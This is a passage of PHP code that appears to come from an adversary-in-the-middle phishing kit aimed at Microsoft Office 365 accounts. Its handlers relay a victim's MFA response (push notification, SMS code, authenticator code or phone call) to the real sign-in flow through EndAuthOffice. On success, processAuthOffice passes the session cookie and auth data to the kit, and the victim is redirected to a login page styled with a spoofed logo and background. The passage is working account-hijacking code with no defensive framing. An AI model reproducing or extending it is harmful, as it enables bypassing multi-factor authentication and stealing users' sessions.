            'ctx' => $beginAuth['Ctx'],
            'flowToken' => $beginAuth['FlowToken'],
            'cookie' => $token['cookie'],
            'method' => $method,
            'session' => $beginAuth['SessionId']
        ]));

        echo json_encode([
            'status' => true,
            'data' => $token,
            'redirect' => "?$redirect&user=$user&bg=$bg&logo=$logo&token=$token&key=$key"
        ]);
    } else {
        echo json_encode(['status' => false, 'message' => 'Verification request failed']);
    }
} else if ($action == 'checkVerify') {
    $user = $_POST['user'];
    $token = json_decode(base64_decode($_POST['token']), true);

    if ($_POST['service'] == 'notif') {
        $endAuth = EndAuthOffice($_POST['token']);
        $newToken = base64_encode(json_encode([
            'ctx' => $endAuth['Ctx'],
            'flowToken' => $endAuth['FlowToken'],
            'cookie' => $token['cookie'],
            'method' => $token['method'],
            'session' => $endAuth['SessionId']
        ]));
        if ($endAuth['Success']) {
            processAuthOffice($endAuth, $user, $token['cookie'], $_POST['key']);

            echo json_encode([
                'status' => true,
                'redirect' => $dir."../login.php?success&id=$user&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo'])
            ]);
        } else {
            echo json_encode(['status' => false, 'message' => 'Verification failed', 'token' => $newToken]);
        }
    } else if ($_POST['service'] == 'sms') {
        $endAuth = EndAuthOffice($_POST['token'], $_POST['otc']);
        $newToken = base64_encode(json_encode([
            'ctx' => $endAuth['Ctx'],
            'flowToken' => $endAuth['FlowToken'],
            'cookie' => $token['cookie'],
            'method' => $token['method'],
            'session' => $endAuth['SessionId']
        ]));
        if ($endAuth['Success']) {
            processAuthOffice($endAuth, $user, $token['cookie'], $_POST['key']);

            header("Location: $dir"."login.php?success&id=$user&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo']));
        } else {
            header("Location: $dir"."verification/?sms&user=$user&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo']) . "&token=$newToken&error&key=" . $_POST['key']);
        }
    } else if ($_POST['service'] == 'code') {
        $endAuth = EndAuthOffice($_POST['token'], $_POST['otc']);
        $newToken = base64_encode(json_encode([
            'ctx' => $endAuth['Ctx'],
            'flowToken' => $endAuth['FlowToken'],
            'cookie' => $token['cookie'],
            'method' => $token['method'],
            'session' => $endAuth['SessionId']
        ]));
        if ($endAuth['Success']) {
            processAuthOffice($endAuth, $user, $token['cookie'], $_POST['key']);

            header("Location: $dir"."login.php?success&id=$user&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo']));
        } else {
            header("Location: $dir"."verification/?phoneappotp&user=$user&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo']) . "&token=$newToken&error&key=" . $_POST['key']);
        }
    } else if ($_POST['service'] == 'call') {
        $endAuth = EndAuthOffice($_POST['token'], '');
        $newToken = base64_encode(json_encode([
            'ctx' => $endAuth['Ctx'],
            'flowToken' => $endAuth['FlowToken'],
            'cookie' => $token['cookie'],
            'method' => $token['method'],
            'session' => $endAuth['SessionId']
        ]));
        if ($endAuth['Success']) {
            processAuthOffice($endAuth, $user, $token['cookie'], $_POST['key']);

            echo json_encode([
                'status' => true,
                'redirect' => $dir."../login.php?success&id=$user&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo'])
            ]);
        } else {
            echo json_encode(['status' => false, 'message' => 'Verification failed', 'token' => $newToken]);
        }
    }
}
